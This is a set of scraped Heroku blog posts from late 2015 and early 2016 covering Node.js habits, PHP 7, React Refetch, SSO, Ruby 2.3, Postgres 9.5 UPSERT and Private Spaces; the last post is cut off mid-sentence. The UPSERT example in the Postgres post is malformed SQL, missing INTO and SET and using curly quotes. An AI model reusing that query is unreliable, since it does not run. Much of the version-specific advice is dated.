{"website": "Heroku", "title": "10 Habits of a Happy Node Hacker (2016)", "author": ["Hunter Loftis"], "link": "https://blog.heroku.com/node-habits-2016", "abstract": "10 Habits of a Happy Node Hacker (2016) Posted by Hunter Loftis November 10, 2015 Listen to this article At the tail end of 2015, JavaScript developers have a glut\nof tools at our disposal. The last time we looked into this, the modern JS landscape was just emerging.\nToday, it's easy to get lost in our huge ecosystem,\nso successful teams follow guidelines to\nmake the most of their time and keep their projects healthy. Here are ten habits for happy Node.js hackers as we enter 2016.\nThey're specifically for app developers , rather than module authors,\nsince those groups have different goals and constraints: 1. Start every new project with npm init Npm's init command will scaffold out a valid package.json for your project,\ninferring common properties from the working directory. $ mkdir my-awesome-app\n$ cd my-awesome-app\n$ npm init --yes I'm lazy, so I run it with the --yes flag and then open package.json to make changes.\nThe first thing you should do is specify an 'engines' key\nwith your current version of node ( node -v ): \"engines\": {\n  \"node\": \"4.2.1\"\n} 2. Use a smart .npmrc By default, npm doesn't save installed dependencies to package.json\n(and you should always track your dependencies!). If you use the --save flag to auto-update package.json, npm\ninstalls the packages with a leading carat ( ^ ), putting your\nmodules at risk of drifting to different versions.\nThis is fine for module development, but not good for apps,\nwhere you want to keep consistent dependencies between all your environments. One solution is installing packages like this: $ npm install foobar --save --save-exact Even better, you can set these options in ~/.npmrc to update your defaults: $ npm config set save=true\n$ npm config set save-exact=true\n$ cat ~/.npmrc Now, npm install foobar will automatically add foobar to package.json\nand your dependencies won't drift between installs! If you prefer to keep flexible dependencies in package.json, but still need to lock down dependencies for production, you can alternatively build npm's shrinkwrap into your workflow.\nThis takes a little more effort, but has the added benefit of preserving\nexact versions of nested dependencies. 3. Hop on the ES6 train Node 4+ packs an updated V8 engine with several useful ES6 features .\nDon't be intimidated by some of the more complex stuff,\nyou can learn it as you go. There are plenty of simple\nimprovements for immediate gratification: let user = users.find(u => u.id === ID);\n\nconsole.log(`Hello, ${ user.name }!`); 4. Stick with lowercase Some languages encourage filenames that match class names,\nlike MyClass and 'MyClass.js'. Don't do that in node.\nInstead, use lowercase files: let MyClass = require('my-class'); Node.js is the rare example of a Linux-centric\ntool with great cross-platform support. While OSX\nand Windows will treat 'myclass.js' and 'MyClass.js' equivalently,\nLinux won't. To write code that's portable between platforms,\nyou'll need to exactly match require statements, including capitalization. The easy way to get this right is to just stick with lowercase\nfilenames for everything, eg 'my-class.js'. 5. Cluster your app Since the node runtime is limited to a single CPU core and about 1.5 GB\nof memory, deploying a non-clustered node app on a large\nserver is a huge waste of resources. To take advantage of multiple cores and memory beyond 1.5 GB,\nbake Cluster support into your app.\nEven if you're only running a single process on small hardware\ntoday, Cluster gives you easy flexibility for the future. Testing is the best way to determine the ideal number of\nclustered processes for your app, but it's good to start with the reasonable defaults offered by your platform, with a simple fallback, eg: const CONCURRENCY = process.env.WEB_CONCURRENCY || 1; Choose a Cluster abstraction to avoid reinventing the wheel of process management.\nIf you'd like separate master and worker files, you can try forky .\nIf you prefer a single entrypoint file and function,\ntake a look at throng . 6. Be environmentally aware Don't litter your project with environment-specific config files!\nInstead, take advantage of environment variables . First, install node-foreman : $ npm install --save --save-exact foreman Next, create a Procfile to specify your app's process types: web: bin/web\nworker: bin/worker Now you can start your app with the nf binary: \"scripts\": {\n  \"start\": \"nf start\"\n} To provide a local development environment, create a\n.gitignore'd .env file, which will be loaded by node-foreman: DATABASE_URL='postgres://localhost/foobar'\nHTTP_TIMEOUT=10000 Now, a single command ( npm start ) will spin up both\na web process and a worker process in that environment.\nAnd, when you deploy your project, it will automatically adapt to the variables on its new host. This is simpler and more flexible than 'config/abby-dev.js',\n'config/brian-dev.js', 'config/qa1.js', 'config/qa2.js', 'config/prod.js', etc. 7. Avoid garbage Node (V8) uses a lazy and greedy garbage collector.\nWith its default limit of about 1.5 GB, it sometimes waits until it\nabsolutely has to before reclaiming unused memory.\nIf your memory usage is increasing, it might not be a leak -\nbut rather node's usual lazy behavior . To gain more control over your app's garbage collector, you can\nprovide flags to V8 in your Procfile : web: node --optimize_for_size --max_old_space_size=920 --gc_interval=100 server.js This is especially important if your app is running\nin an environment with less than 1.5 GB of available memory.\nFor example, if you'd like to tailor node to a 512 MB container, try: web: node --optimize_for_size --max_old_space_size=460 --gc_interval=100 server.js 8. Hook things up Npm's lifecycle scripts make great hooks for automation.\nIf you need to run something before building your app,\nyou can use the preinstall script.\nNeed to build assets with grunt, gulp, browserify, or webpack?\nDo it in a postinstall script. In package.json: \"scripts\": {\n  \"postinstall\": \"bower install && grunt build\",\n  \"start\": \"nf start\"\n} You can also use environment variables to control these scripts: \"postinstall\": \"if $BUILD_ASSETS; then npm run build-assets; fi\",\n\"build-assets\": \"bower install && grunt build\" If your scripts start getting out of control, move them to files: \"postinstall\": \"scripts/postinstall.sh\" Scripts in package.json automatically have ./node_modules/.bin added to their PATH , so you can execute binaries like bower or webpack directly. 9. Only git the important bits Most apps are composed of both necessary files and generated files.\nWhen using a source control system like git, you should avoid tracking anything that's generated. For example, your node app probably has a node_modules directory for dependencies, which you should keep out of git .\nAs long as each dependency is listed in package.json, anyone can create a working\nlocal copy of your app - including node_modules - by running npm install . Tracking generated files leads to unnecessary noise and bloat in your git history.\nWorse, since some dependencies are native and must be compiled,\nchecking them in makes your app less portable because you'll be\nproviding builds from just a single, and possibly incorrect, environment. For the same reason, you shouldn't check in bower_components or the\ncompiled assets from grunt builds. If you've accidentally checked in node_modules before, that's okay.\nYou can remove it like this: $ echo 'node_modules' >> .gitignore\n$ git rm -r --cached node_modules\n$ git commit -am 'ignore node_modules' I also ignore npm's logs so they don't clutter my code: $ echo 'npm-debug.log' >> .gitignore\n$ git commit -am 'ignore npm-debug' By ignoring these unnecessary files, your repositories will be smaller,\nyour commits will be simpler, and you'll avoid merge conflicts in\nthe generated directories. 10. Simplify Tech predictions are famously inaccurate, but I'll make one here for the upcoming year.\nI predict that 2016 will be the year of simplification in JavaScript. A growing group of developers are simplifying their architectures already.\nInstead of monolithic MVCs with big frameworks, they're building apps with static frontends ,\nwhich can be served over CDN,\nwith a Node.js API for dynamic data. We're also beginning to see the drag that complex build systems put on our projects.\nThe leading edge of developers are simplifying their builds -\nfor instance, by using a 'vanilla' build without bower, gulp, or grunt . Finally, we'll simplify our code in 2016.\nSometimes, this will come from removing features, as with Douglas Crockford's \"The Better Parts.\" Other times, this will come from adding features - like my favorite callback replacement, async-await .\nAsync-await isn't yet available in Node,\nbut you can use it today via the awesome BabelJS project. Instead of seeing how many tools and frameworks you can cram in at once,\ntry to simplify your work! What are your habits? I try to follow these habits in all of my projects.\nWhether you're new to node or a server-side JS veteran, I'm sure you've developed tricks of your own.\nWe'd love to hear them!\nShare your habits by tweeting with the #node_habits hashtag. Happy hacking! node npm javascript es6 es7", "date": "2015-11-10,"},
{"website": "Heroku", "title": "50% and Counting: PHP 7 Takes Off", "author": ["David Zuelke"], "link": "https://blog.heroku.com/php7", "abstract": "50% and Counting: PHP 7 Takes Off Posted by David Zuelke December 15, 2015 Listen to this article A year and half ago, we launched support for PHP on Heroku , built from the ground up with modern features designed to give developers a more elegant and productive experience on the platform. Last week, we made PHP 7 available on top of a new, reworked version of our PHP support, and our users are adopting PHP 7’s exciting new features and stellar performance improvements quickly—we’re already seeing PHP 7 being used in the majority of PHP deploys on Heroku. Under the hood, much of the logic that handles a deploy has changed, but not the fundamental principles upon which our support for PHP applications is designed. We've always been determined to provide a fully standards-based implementation that does not rely on proprietary configuration or magic behavior, and that means building on top of a great foundation of tools. Composer Rising Inspired by an explosion of collaboration in Open Source that had been sparked by GitHub in general and their Pull Requests 2.0 in particular, the PHP ecosystem witnessed the birth of Composer in 2011. Thanks to the inspiring and ongoing work of Jordi Boggiano , Nils Adermann , and all other contributors to the Composer project, the result has been a perpetual cycle of growth in collaboration, quality and popularity across frameworks and libraries. Today, even competing frameworks make liberal use of each other’s components, because the PHP community at large has adopted a culture of sharing and of working together. Developers benefit from faster release cycles and a wealth of packages to choose from. Packagist, the official Composer package repository, is now serving well over 100 million package installs per month , and will be on the verge of cracking the mark of a billion and a half installs before this year is out. That's why Heroku has always honored a project’s composer.json (or, more specifically, composer.lock ) for not only the installation of dependencies, but also when resolving which language runtimes and extensions to install—there is no admin panel or separate configuration for runtimes and extensions. If a user requires PHP 5.5.* , they get the latest PHP 5.5. If a user wants the latest possible PHP version, but also needs an extension that is not yet available for PHP 7, they get the latest PHP 5.6. Thanks to this behavior, we've already seen a lot of deploys getting resolved to PHP 7. Currently, over 50% of all PHP application deploys on Heroku are getting built using PHP 7.0 . This number could be even higher, but we're being cautious about the default version—if a user specifies absolutely nothing regarding their required PHP version, they will get the latest PHP 5.6, as that is a safer bet for backwards compatibility with legacy applications. Extensions are also a factor: once common ones like memcached or redis are ready for PHP 7, we're expecting even more applications to make the switch. The system now actually uses Composer itself during the build to install not only application dependencies, but also language runtimes and extensions. This allows us to give users useful hints about requirements that cannot be satisfied, or conditionally auto-install extensions for add-ons such as Blackfire or New Relic without interfering with the pre-determined set of dependencies. We will be rolling out even more exciting user-facing features and performance improvements that build upon this architecture in the coming weeks and months. Take It For a Spin All you need to deploy an application using PHP 7 today is a composer.json that has a sufficiently lenient version selector for PHP 7. You should also ensure that none of your dependencies prevent the use of PHP 7. The PHP Support reference article on Heroku Dev Center provides an overview of available runtimes and extensions. Our Getting Started with PHP on Heroku guide will walk you through the simple steps of creating a free Heroku account (if you don't have one yet) and deploying your first app—it'll be built using PHP 7! Alternatively, why not start a new app from scratch, or deploy an existing application? Any suitable version requirement for package php such as >=5.3.3 or ^5.6.0|^7.0.0 will work. You can use the composer require command to quickly update your preferences to allow both 5.6+ and 7, e.g.: $ composer require \"php:^5.6|^7.0\" After that, git add composer.json composer.lock , commit the change, and push! php composer", "date": "2015-12-15,"},
{"website": "Heroku", "title": "Introducing React Refetch", "author": ["Ryan Brainard"], "link": "https://blog.heroku.com/react-refetch", "abstract": "Introducing React Refetch Posted by Ryan Brainard December 15, 2015 Listen to this article Heroku has years of experience operating our world-class platform, and we have developed many internal tools to operate it along the way; however, with the introduction of Heroku Private Spaces , much of the infrastructure was built from the ground up and we needed new tools to operate this new platform. At the center of this, we built a new operations console to give ourselves a bird's eye view of the entire system, be able to drill down into issues in a particular space, and everything in between. The operations console is a single-page React application with a reverse proxy on the backend to securely access data from a variety of sources. The console itself started off from a mashup of a few different applications, all of which happened to be using React, but all three were using different methods of loading data into the components. One was manually loading data into component state with jQuery, one was using mixins to do basically the same thing, and one was using classic Flux to load data into stores via actions. We obviously needed to standardize on a way to load data, but we weren't really happy with any of our existing methods. Loading data into state made components smarter and more mutable than they needed to be, and these problems only became worse with more data sources. We liked the general idea of unidirectional flow and division of responsibility that the Flux architecture introduced, but it also brought a lot of boilerplate and complexity with it. Looking around for alternatives, Redux was the Flux-like library du jour, and it did seem very promising. We loved how the React Redux bindings used pure functions to select state from the store and higher-order functions to inject and bind that state and actions into otherwise stateless components. We started to move down the path of standardizing on Redux, but there was something that felt wrong about loading and reducing data into the global store only to select it back out again. This pattern makes a lot of sense when an application is actually maintaining client-side state that needs to be shared between components or cached in the browser, but when components are just loading data from a server and rendering it, it can be overkill. Furthermore, we realized that all of our application's state was already represented in the URL. We decided to embrace this. For something like an operations console, this is a really important property. This means that if an engineer is diagnosing an issue, he or she can send the URL to a colleague who can load it up and see the same thing. Of course, this is nothing new -- this is how URLs are supposed to work by locating unique resources; however, this has been lost to a certain degree with single page applications and the shift to moving application state to the browser. Using something like React Router , it becomes very easy to keep URLs front and center, maintain state in dynamic parameters, and pass them down to components as props. With the application's state represented in the URL, all we needed to do was translate those props into requests to fetch the actual data from backend services. To do this, we built a new library called React Refetch . Similar to the React Redux bindings, components are wrapped in a connector and given a pure function to select data that is injected as props when the component mounts. The difference is that instead of selecting the data from the global store, React Refetch pulls the data from remote servers. The other notable difference is that because the data is automatically fetched when the component mounts, there's no need to manually fire off actions to get the data into the store in the first place. In fact, there is no store at all. All state is maintained as immutable props, which are ultimately controlled by the URL. When the URL changes, the props change, which recalculates the requests, new data is fetched, and it is reinjected into the components. All of this is done simply and declaratively with no stores, no callbacks, no actions, no reducers, no switch statements -- just a function that maps props to requests. This is best shown with an example. Let's say we have the following route (note, this example uses React Router and ES6 syntax, but these are not requirements): <Route path=\"/users/:userId\" component={Profile}/> This passes down the userId param as a prop into the Profile component: import React, { Component, PropTypes } from 'react'\n\nexport default class Profile extends Component {\n  static propTypes = {\n    params: PropTypes.shape({\n      userId: PropTypes.string.isRequired,\n    }).isRequired\n  }\n\n  render() {\n    // TODO\n  }\n} Now we know which user to load, but how do we actually load the data from the server? This is where React Refetch comes in. We simply define a pure function to map the props to a request: (props) => ({\n   userFetch: `/api/users/${props.params.userId}`\n}) This is then wrapped up in connect() and we pass in our component: export default connect((props) => ({\n  userFetch: `/api/users/${props.params.userId}`\n}))(Profile) When Profile mounts, the request will automatically be calculated and the data fetched from the server. As soon as the request is fired off, the userFetch prop is injected into the component. This prop is a PromiseState , which is a composable representation of the Promise of the data at a particular point in time. While the request is still in flight, it is pending , but once the response is received, it will be either fulfilled or rejected . This makes it easy to reason about and render these different states as an atomic unit rather than a group of variables loosely connected with some naming convention. Now, we can fill in our render() function now like this: render() {\n  const { userFetch } = this.props \n\n  if (userFetch.pending) {\n    return <LoadingAnimation/>\n  } else if (userFetch.rejected) {\n    return <Error error={userFetch.reason}/>\n  } else if (userFetch.fulfilled) {\n    return <User user={userFetch.value}/>\n  }\n} If we want to display a different user, just change the URL in the browser. With React Router, this can be done with either a <Link/> or programmatically with history.pushState() . Of course manual changes to the URL work too. This will trigger the userId prop to change, React Refetch will recalculate the request, fetch new data from the server, and inject a new userFetch in the component. In this new world, state changes look like this: This is the simplest use case of React Refetch, but it demonstrates the basic flow. The library also supports many other options such as composing multiple data sources , chaining requests , periodically refreshing data , custom headers and methods , lazy loading data , and even writing data to the server . Several of these features leverage \" fetch functions \" which allow the mappings to be calculated in response to user actions. Instead of requests being fired off immediately or when props change, the functions are bound to the props and can be called later with additional arguments. This is a powerful feature that provides data control to the component while still maintaining one-way data flow. While building the operations console, we experienced a lot of trial and error learning how best to load remote data into React. Architectures like Flux and Redux can be wonderful if an application requires complex client-side state; however, if components just need to load data from a handful of sources and have no need to maintain that state in the browser after it renders, React Refetch can be a simpler alternative. React Refetch is available through npm as react-refetch , and many more examples are shown in the project's readme . react", "date": "2015-12-15,"},
{"website": "Heroku", "title": "SSO for Heroku now in Public Beta", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/sso-for-heroku", "abstract": "SSO for Heroku now in Public Beta Posted by Ike DeLorenzo December 16, 2015 Listen to this article We're pleased to announce the beta of SSO for Heroku .  With this beta, Heroku now supports the current and most widely supported SSO standard known as SAML 2.0, and has partnered with leading identity providers (IdPs) for easy set-up.  Customers can use their existing identity provider like Salesforce Identity , Okta, PingOne, Microsoft Active Directory, and PingFederate for their employees' single sign-on to Heroku Enterprise . SSO is expected to be generally available in early February.  Initially, it will be available to Heroku Enterprise customers.  For enterprise customers who want to use the feature during the beta period, it is now available in the \"Settings\" tab of their Heroku org. We've worked hard to make the set up easy (a few minutes in most cases), yet flexible enough to robustly support less common or home-grown IdPs.  Connecting existing identity solutions to Heroku is straightforward for identity administrators, as is setting up a new IdP with Heroku.  End-users are presented with a guided two-step upgrade path to SSO when they are added to the IdP, and new user accounts are auto-provisioned in real-time based on the IdP authentication. We are also partnering with major identity providers to build Heroku support into their products.  So for leading IdPs -- like Salesforce Identity, Okta, PingOne, and PingFederate --  set-up for system administrators can be as easy as adding Heroku as a known and supported \"service provider,\" and providing the Heroku organization name.  In a few clicks both the IdP and Heroku will be fully set up and ready for test, and then for easy deployment to the entire company.   Other popular cloud-based IdPs will be launching built-in support for Heroku in the first quarter of 2016.  All operate with the high level of security and reliability Heroku customers have come to expect from our products and partners. Additionally, SSO for Heroku fully supports Microsoft's Active Directory.  SSO support in Heroku also works well with minimal but manual set-up for most other SAML 2.0 compliant identity provider solutions. Heroku Enterprise customers who would like to be part of the beta can start now.  We welcome your questions or feedback; you can reach us at sso-beta@heroku.com . SSO Identity Provider IdP saml", "date": "2015-12-16,"},
{"website": "Heroku", "title": "The Heroku 2015 Retrospective", "author": ["Vikram Rana"], "link": "https://blog.heroku.com/the_heroku_2015_retrospective", "abstract": "The Heroku 2015 Retrospective Posted by Vikram Rana January 06, 2016 Listen to this article As we start this New Year, we wanted to give you a recap of our 2015, a year filled with a lot of new products and features. We especially want to express our gratitude to everyone who helped us with inspiration, beta testing, and feedback. In case you missed anything, here are the highlights of 2015. Advancing the Developer Experience Review Apps With Review Apps, for every GitHub pull request, Heroku spins up a disposable Review App so everyone on your team can see the changes live, speeding up decisions and leading to higher quality apps. New Dynos Build apps at any scale on Heroku with a new lineup of dyno types and prices: Performance-L, Performance-M, Standard 1X and 2X, Hobby, and Free. GitHub Integration Connect your GitHub repo to automatically or manually deploy to a Heroku app on every push to a branch. Pipelines Pipelines are a clear and structured workflow for a group of apps that share the same codebase, allowing teams to visualize and manage the continuous delivery of changes from development to production. Local Docker Builds Develop and deploy apps locally using a Cedar-like Docker container and then deploy to Heroku for high fidelity dev/prod parity. Heroku Elements Heroku Elements brings the entire Heroku ecosystem of add-ons, buildpacks, and buttons together in one place so you can extend your app, customize your stack, and jump-start your project. Official Go Support Use the Heroku developer experience to build Go apps and get fast support for latest Go versions and notifications of critical vulnerabilities. Parse + Heroku Build mobile apps with the convenience of Parse’s cross-platform mobile SDKs together with the flexibility and scale of Heroku for the backend. PHP 7 Build PHP apps on Heroku taking advantage of PHP 7’s new features, including higher performance, new operators, anonymous classes, and many more. Get More from Your Data on Heroku Heroku Redis Heroku Redis combines the in-memory key-value store you love with a robust developer experience, all delivered as a service by Heroku’s operational experts. Heroku Data Links Use a Postgres database to federate data across other data stores like Redis, giving you the benefits of data federation and the ability to use SQL to query data across local and remote data stores. Postgres 9.4 Take advantage of increased performance with materialized views and the new JSONB data type with GIN indexes for faster access to JSON data. PGBackups You can schedule backups with the new PGBackups, and have greater reliability in your backup jobs. New Dataclips Everyone on your team, including non-developers, can be more productive with data on Heroku using the new Dataclips, thanks to a redesigned UX, fast search for discovery, and bulk recovery options. Heroku Connect Demo Edition Get hands-on using a free version of Heroku Connect to prototype applications that sync data between Heroku Postgres and Salesforce. Heroku Enterprise: Advanced Controls for Large Organizations Heroku Enterprise Heroku Enterprise is a new edition of Heroku that helps large organizations take advantage of the Heroku developer experience while meeting their unique needs for more advanced collaboration, better access controls, and enterprise-grade support. Private Spaces Private Spaces is a new runtime that delivers the same great Heroku developer experience, enhanced with network isolation and control for a group of apps and data you define. Fine Grained Access Controls Use roles and app privileges to manage access to apps at different levels of granularity in your Organization account. SSO for Heroku Single Sign-on (SSO) for Heroku lets you use SAML 2.0 Identity Providers to log into Heroku. The Year Ahead Building on the momentum of 2015, we look forward to continuing to make building amazing apps even easier. We have many exciting features planned across developer experience, data, collaboration and enterprise that will expand Heroku to far many more use cases in 2016, and we can’t wait to share them with you! We always love hearing from you on the features we shipped and the ones you would like to see us ship, so send us feedback .", "date": "2016-01-06,"},
{"website": "Heroku", "title": "Ruby 2.3 on Heroku with Matz", "author": ["Terence Lee"], "link": "https://blog.heroku.com/ruby-2-3-0-on-heroku-with-matz", "abstract": "Ruby 2.3 on Heroku with Matz Posted by Terence Lee December 24, 2015 Listen to this article Happy Holidays from Heroku. Congratulations to the ruby-core team on a successful 2.3.0 release , which is now available on Heroku -- you can learn more about Ruby on Heroku at heroku.com/ruby . We had the pleasure of speaking with Matz (Yukihiro Matsumoto), the creator of Ruby and Chief Ruby Architect at Heroku, about the release. What’s New in Ruby 2.3: Interview with Matz Ruby releases happen every year on Christmas day. Why Christmas? Ruby was originally my pet project, my side project. So releases usually happened during my holiday time. Now, it’s a tradition. It’s ruby-core’s gift to the Ruby community. Do you have any favorite features coming in Ruby 2.3? I’m excited about the safe navigation operator, or “lonely operator.” It’s similar to what we see in other programming languages like Swift and Groovy— it makes it simple to handle exceptions. The basic idea is from Objective C in which nil accepts every message and returns nil without doing anything. In that way you can safely ignore the error that is denoted by nil . In Swift, they have better error handling using optional types, but the fundamental idea is the same. Instead of using nil , they use optional types. Since Ruby is an older language, it follows the old way. In the very early stages of Ruby, before releasing in 1995, I added that nil pattern in the language. But it consumed all the errors, which meant error detection was terrible, so I gave up that idea. With the new operator, you can use the nil pattern and avoid accidentally ignoring errors. Swift and Groovy use a different operator: ?. (question dot). And Ruby couldn’t use that because of predicate methods. So I coined it from the &. (ampersand dot) pattern. Was there any discussion of adopting Active Support’s try ? The try uses the send method, which is not really fast enough. I believe those kind of things should be built into the language. What are some other highlights in 2.3? The did_you_mean gem , which helps with method name misspellings, is great as a default feature. We bundle it now, so it’s now a default and you don’t have to do anything extra. We included it because for Ruby 3 we’re working towards better compilation and collaboration, and this is the first step in that direction. Better error messages help developers’ productivity and happiness. Are there any features that are not getting the attention they deserve or may surprise developers? I don’t know. I like the new dig method, which is related to the safe navigation operator. It makes it simple to “dig up” nested elements from nested hashes and arrays, which is useful when dealing with parsed JSON. These days, this method is kind of popular, especially when using an API for microservices. In such cases, the dig method and safe navigation operator would be quite useful, especially with optional attributes. Are there any features that you secretly hope no one will use, so you can remove them later? No, but the frozen string literal pragma is kind of controversial. We might change it in a later version. How would you decide if it stays or goes? The Rails team got a lot of pull requests that say add the freeze everywhere. The literal freeze method is much faster by comparison in 2.2. People wanted to make it faster by avoiding the string allocation and reducing the GC pressure. We understood that intention, but adding a freeze everywhere is so ugly and we didn’t want that. That’s why we introduced the magic comment of frozen string literals. At the same time, I don’t like that a magic comment can change the semantics or behavior of the language. So that point is kind of controversial. We’ll see how well it works out. Do you anticipate any backwards-compatibility issues when migrating from Ruby 2.3 to Ruby 3? Fundamentally, we will not change anything in a backward incompatible way. I expect every Ruby 2.x program to run without any modification in the future version of Ruby. Even the frozen strings stuff is basically compatible. In Ruby 3, if we do have to make an incompatible change, we have to provide a reasonable reason. And also we have to provide a migration path that is not too difficult. That’s our strategy towards the future version. Thank you for your time! I hope we can have this kind of conversation again in the future! This interview was conducted by Terence Lee and Richard Schneeman, members of Heroku’s Ruby Task Force. You can find them on twitter, @hone02 and @schneems . ruby matz", "date": "2015-12-24,"},
{"website": "Heroku", "title": "Here's Postgres 9.5: Now Available on Heroku", "author": ["Rimas Silkaitis"], "link": "https://blog.heroku.com/postgres-95-now-available-on-heroku", "abstract": "Here's Postgres 9.5: Now Available on Heroku Posted by Rimas Silkaitis January 07, 2016 Listen to this article Heroku has long been committed to making PostgreSQL one of the best relational databases in the world. We’re also committed to giving you the ability to try the latest release as soon as it’s available. Today, we’re pleased to announce the public beta of Postgres 9.5 on Heroku. PostgreSQL 9.5 brings a bevy of super exciting new features with the most prominent being the new UPSERT functionality. UPSERT gives you the expected behavior of an insert, or, if there is a conflict, an update, and is performant without the risk of race conditions for your data. UPSERT was one of the last few detracting arguments against PostgreSQL. A special thanks goes to Peter Geoghegan on the Heroku Postgres team for committing the better part of two years developing the functionality as its primary author, along with contributions from Andres Freund from Citus Data and Heikki Linnakangas. You can get started right now with PostgreSQL 9.5 on Heroku by passing in the version flag during a provision request: heroku addons:create heroku-postgresql --version=9.5 This lets customers who want to try out the new release an easy way to do so, while customers who are happy with the current version can stay on 9.4 until 9.5 matures and we make it generally available. New databases will continue to default to 9.4. INSERT … ON CONFLICT UPSERT is meant for use during an INSERT operation in the database. If during that insert procedure a conflict occurs because a record already exists in the database ( ON CONFLICT ), the existing record would be updated instead of a new one being created. Digging a little deeper, this is what makes PostgeSQL’s UPSERT functionality so special. PostgreSQL UPSERT will determine if there’s a conflict based on a unique index in the table on specified set of columns. But, if that table has other unique indexes or unique constraints, PostgreSQL will throw a violation in the event of duplicates. This results in the database keeping your data safe by respecting all of the unique constraints within the table. Let’s walk through an example. Assume that a PostgreSQL database has a table called inventory that manages the current state of the amount of products in the warehouse. In that table, there are three columns, product_id , amount , and notes . On top of that, let’s assume that there’s a unique index on product_id . Let’s say that someone in our warehouse is keying in new information about what’s on hand. The application may or may not know if the product being keyed in actually exists in the inventory table. So during an insert, we’d rather update the amount instead of creating a new record. Getting started with UPSERT is fairly easy. For any of your normal INSERT statements that you’ve created, a few more keywords are added to the end of the statement to invoke UPSERT. INSERT products (\n  product_id,\n  amount,\n  notes\n) VALUES (\n  1234,\n  10,\n  ‘some of the items are damaged’\n)\nON CONFLICT (product_id) DO UPDATE notes = ‘arrived on time’; Once you’ve specified the ON CONFLICT , you have two options. The first is to tell PostgreSQL to update particular columns that you’ve defined and the second is to ignore the insert all together. With the new UPSERT functionality, this should greatly simplify application code. Other Noteworthy Improvements BRIN Indexes - This new type of index is great for very large tables where computing a normal index may be too expensive. If you’ve ever wanted to summarize data in different ways, beyond what you could do in a GROUP BY clause, new summarization primitives have been added. Version Policy Postgres 9.5 is currently in beta. We encourage customers to wait to put their production applications on this new version until it officially reaches GA. Once we are confident that this new version is stable enough, based on discussions with customers and the community at large, we’ll make 9.5 the default for all new databases created on Heroku. Getting Starting UPSERT is only one of the many exciting new improvements in this release of PostgreSQL 9.5. Give UPSERT and all the other new features a shot and let us know what you think! postgres postgres 9.5 upsert", "date": "2016-01-07,"},
{"website": "Heroku", "title": "SSO for Heroku Now Generally Available", "author": ["Kathy Simpson"], "link": "https://blog.heroku.com/sso-for-heroku-enterprise", "abstract": "SSO for Heroku Now Generally Available Posted by Kathy Simpson January 26, 2016 Listen to this article Today we’re pleased to announce that SSO for Heroku is generally available for Heroku Enterprise customers. SSO for Heroku supports single sign-on for SAML 2.0 compliant identity providers (IdPs), making it easier for Heroku Enterprise customers to manage identity across various systems.  It also simplifies set-up for system administrators, allowing them to focus on managing authentication. Both cloud and on-premise identity providers are supported by SSO for Heroku.  As of today, a number of popular commercial IdPs ship with built-in support for SSO for Heroku, including Salesforce Identity, Okta, PingOne and PingFederate.  SSO for Heroku is also fully compatible with identity services from Microsoft Active Directory. For more detailed information, see our previous post , and our Heroku Dev Center docs for IdP administrators , or their end-users .  IdP vendors interested in integrating with SSO for Heroku are invited to contact us .  Finally, we welcome any feedback from end users on additional IdPs you’d like to see supported.", "date": "2016-01-26,"},
{"website": "Heroku", "title": "Heroku Private Spaces Now Generally Available ", "author": ["Tim Lang"], "link": "https://blog.heroku.com/heroku_private_spaces_are_now_generally_available_within_heroku_enterprise", "abstract": "Heroku Private Spaces Now Generally Available Posted by Tim Lang January 26, 2016 Listen to this article Today Heroku is announcing that Heroku Private Spaces is generally available.  Introduced in beta in September, Private Spaces is a new Heroku runtime designed from the ground up to meet the trust and control requirements of the most demanding applications. This new architecture enables Private Spaces to deliver the best of both worlds: the easy and powerful Heroku developer experience, combined with the network and trust controls historically only available in on-premise, behind-the-firewall deployments. Made available as part of Heroku Enterprise, Private Spaces makes cloud-based PaaS ready for the most critical enterprise applications. Heroku Spaces are designed to fit in seamlessly with the rest of the Heroku experience. A Private Space contains all the familiar elements of a Heroku application, including dynos and add-ons. All the tools for creating and managing applications, such as GitHub integration, Heroku Button, and Metrics, are the same for apps running on traditional Heroku (the “ Common Runtime ”) and in Private Spaces. Most importantly, creating a Private Space—a private PaaS, dedicated to your organization and its applications—takes just a single click and a couple of minutes; something that can otherwise take even the best organizations many months. Private Spaces Complementing the existing Heroku runtime, Private Spaces is an entirely new architecture that provides important new capabilities while retaining full compatibility with existing Heroku apps. Specific benefits new with Private Spaces include: Dedicated, private runtime: Each Private Space has a complete dyno runtime dedicated exclusively to the applications running in the space. This ensures the strongest level of isolation for applications, networking and infrastructure resources, in turn enabling production apps to meet stringent security and trust requirements. With Spaces, the developer experience hasn’t changed: deployment, scaling and monitoring are performed in exactly the same way using Heroku Toolbelt or Dashboard. Global region availability: Since Private Spaces are discrete, self contained Heroku runtimes, they can be deployed with new kinds of flexibility—including new geographic options. As of GA, Spaces can be deployed in Tokyo, Frankfurt, Oregon and Virginia, offering lower latencies for users and developers in those areas. Network controls: One of the more powerful new features of Private Spaces is the control it provides over the networking layer, and the ability to restrict inbound access and outbound traffic origination for the applications that run inside it.  Using network controls, Heroku applications can now be bound to other applications, VPNs, or even behind the firewall deployments.  With the Trusted IP feature, IP ranges that can access your applications can easily be specified.  And with Outbound IP management, all the traffic from applications in a Space automatically routes from a set of stable, persistent IP addresses. Private Data Services: One of the most critical aspects of any app is how it processes and stores sensitive business data. Private Spaces allow data services to be created and managed inside the secure boundary of a Space ensuring that all traffic between dynos and databases flow over the private network. Use the same simple heroku addons:create command to create fully managed Heroku Postgres and Heroku Redis data stores that run inside the Private Space. Using Private Spaces Private Spaces appear inside of the Dashboard under a new Spaces tab, which is shown whenever a Heroku Enterprise organization is selected.  From this tab, Spaces can be created with a single click, and Spaces settings (such as Trusted IP ranges) can be configured.  Spaces can also be managed via the Heroku CLI; for instructions and full list of commands, see the Private Spaces documentation . Private Spaces and their components, including Private Dynos and Private data services, are metered and billed like other Heroku components.  Specific utilization and cost information is displayed within the Dashboard of a Heroku Enterprise organization. Customer Experience with Private Spaces We’d like to thank the beta program participants, whose feedback and guidance was essential to creating Private Spaces.  With Spaces, KLM Royal Dutch Airlines is looking ahead to providing better user experiences for its global travelers, Moneytree is able to transform personal finance for Japanese users with a new multi-device consumer finance app that runs closer to their users, and Mozilla is excited at the potential for private data services to expand the kinds of information they can store on Heroku. \"We already love Heroku Private Spaces.  It builds on the power and flexibility of the service by giving us a higher level of security that our users expect when handling sensitive data,\" said Jon Buckley, Mozilla Foundation Operations. Private Spaces, Heroku Enterprise and App Cloud Introduced last year, App Cloud is salesforce.com’s family of platform and application development technologies.  As part of App Cloud, Heroku Enterprise is built out of the box to connect and integrate with the App Cloud services offered by Force.com; Heroku Connect lets applications automatically share data between Force.com and Heroku Postgres, SSO for 